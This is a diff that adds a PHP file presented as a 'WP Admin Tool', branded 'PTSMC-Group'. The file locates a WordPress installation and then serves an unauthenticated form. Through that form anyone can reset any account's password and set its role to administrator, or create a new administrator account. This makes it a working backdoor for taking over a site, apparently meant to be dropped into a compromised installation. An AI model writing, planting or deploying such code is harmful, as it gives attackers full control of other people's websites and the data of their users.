@@ -1,0 +1,249 @@
+<?php
+/**
+ * WP Admin Tool - English Version
+ * Supports deep subdirectory placement.
+ */
+
+ini_set('display_errors', 0);
+error_reporting(E_ALL);
+
+$message = '';
+$msg_type = '';
+
+// --- WORDPRESS AUTO-DISCOVERY LOGIC ---
+
+$wp_found = false;
+$current_dir = dirname(__FILE__);
+$max_levels = 10; // Max directory levels to go up
+$level = 0;
+
+while ($level < $max_levels) {
+    // Check if wp-blog-header.php exists in current level
+    if (file_exists($current_dir . '/wp-blog-header.php')) {
+        // Found it! Load the files
+        require_once($current_dir . '/wp-blog-header.php');
+        require_once(ABSPATH . 'wp-includes/registration.php');
+        require_once(ABSPATH . 'wp-includes/pluggable.php');
+        require_once(ABSPATH . 'wp-includes/user.php');
+        $wp_found = true;
+        break; // Stop the loop
+    }
+    
+    // Go up one level
+    $current_dir = dirname($current_dir);
+    $level++;
+}
+
+// --- END DISCOVERY LOGIC ---
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action_admin'])) {
+
+    if (!$wp_found) {
+        $message = "Error: Could not locate WordPress root files (wp-blog-header.php). Please make sure this script is inside a WordPress installation folder.";
+        $msg_type = 'error';
+    }
+
+    if (empty($message)) {
+        // take input
+        $target_user = sanitize_text_field($_POST['username']);
+        $new_pass    = $_POST['password'];
+        $target_email= sanitize_email($_POST['email']);
+
+        if (empty($target_user) || empty($new_pass)) {
+            $message = "Error: Username and Password are required.";
+            $msg_type = 'error';
+        } else {
+            // Check User
+            $user = get_user_by('login', $target_user);
+
+            // SCENARIO 1: UPDATE EXISTING USER
+            if ($user) {
+                wp_set_password($new_pass, $user->ID);
+                $u_obj = new WP_User($user->ID);
+                $u_obj->set_role('administrator');
+
+                $message = "<strong>Success!</strong><br>User '{$target_user}' exists. Password has been reset and role set to Administrator.";
+                $msg_type = 'success';
+            } 
+            // SCENARIO 2: CREATE NEW USER
+            else {
+                if (empty($target_email)) {
+                    $message = "Error: Email is required for creating a new user.";
+                    $msg_type = 'error';
+                } elseif (email_exists($target_email)) {
+                    $message = "Error: The email address '{$target_email}' is already in use.";
+                    $msg_type = 'error';
+                } else {
+                    $user_id = wp_create_user($target_user, $new_pass, $target_email);
+                    if (is_int($user_id)) {
+                        $u_obj = new WP_User($user_id);
+                        $u_obj->set_role('administrator');
+                        $message = "<strong>Success!</strong><br>New Administrator user '{$target_user}' has been created.";
+                        $msg_type = 'success';
+                    } else {
+                        $message = "System Error: Could not create user.";
+                        $msg_type = 'error';
+                    }
+                }
+            }
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wordpress PTSMC</title>
+    <link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            background-color: #350000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 2.5rem;
+            border-radius: 35px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #ff0000;
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #ff0000;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dcdcde;
+            border-radius: 17px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #b12222;
+            outline: none;
+            box-shadow: 0 0 0 1px #b12222;
+        }
+        button.submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #b12222;
+            color: white;
+            border: none;
+            border-radius: 17px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 35px;
+        }
+        button.submit-btn:hover {
+            background-color: #135e96;
+        }
+        .alert {
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 17px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .alert-success {
+            background-color: #faeded;
+            color: #01cb00;
+            border: 1px solid #ff0000;
+        }
+        .alert-error {
+            background-color: #fde8e8;
+            color: #9b1c1c;
+            border: 1px solid #f8b4b4;
+        }
+        .note {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #ff0000;
+            text-align: center;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        .login-btn {
+            display: block;
+            text-align: center;
+            background: #700000;
+            color: white;
+            padding: 12px;
+            text-decoration: none;
+            border-radius: 17px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <h2>Wordpress by PTSMC-Group</h2>
+
+    <?php if (!empty($message)): ?>
+        <div class="alert alert-<?php echo $msg_type; ?>">
+            <?php echo $message; ?>
+        </div>
+        <?php if ($msg_type === 'success'): ?>
+            <a href="<?php echo site_url('wp-login.php'); ?>" target="_blank" class="login-btn">Go to WP-Admin Login</a>
+        <?php endif; ?>
+    <?php endif; ?>
+
+    <?php if ($msg_type !== 'success'): ?>
+    <form method="POST" action="">
+        <input type="hidden" name="action_admin" value="1">
+        
+        <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required placeholder="Enter admin username">
+        </div>
+
+        <div class="form-group">
+            <label for="password">New Password</label>
+            <input type="text" id="password" name="password" required placeholder="Enter new password">
+        </div>
+
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="Required only for new user">
+            <small style="color:#888; font-size:11px; display:block; margin-top:5px;">* Email is mandatory if the user does not exist yet.</small>
+        </div>
+
+        <button type="submit" class="submit-btn">Process Request</button>
+    </form>
+    <?php endif; ?>
+
+    <div class="note">
+        <strong>Security Warning:</strong><br>
+        Please delete this file immediately after you have successfully logged in.
+    </div>
+</div>
+
+</body>
+</html>
